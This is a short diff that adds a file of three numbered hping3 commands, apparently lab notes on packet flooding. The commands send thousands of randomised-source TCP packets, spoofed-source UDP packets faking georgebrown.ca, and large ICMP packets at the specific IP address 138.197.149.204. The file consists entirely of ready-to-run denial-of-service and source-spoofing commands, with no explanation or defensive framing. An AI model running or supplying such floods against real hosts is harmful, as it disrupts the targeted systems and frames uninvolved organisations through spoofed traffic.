@@ -1,0 +1,5 @@
+1) hping3 -c 10000 --rand-source 138.197.149.204
+
+2) hping3 -c 9000 --faster --udp --spoof georgebrown.ca 138.197.149.204
+
+3) hping3 -c 11000 -1 -d 1024 -i u75000 138.197.149.204
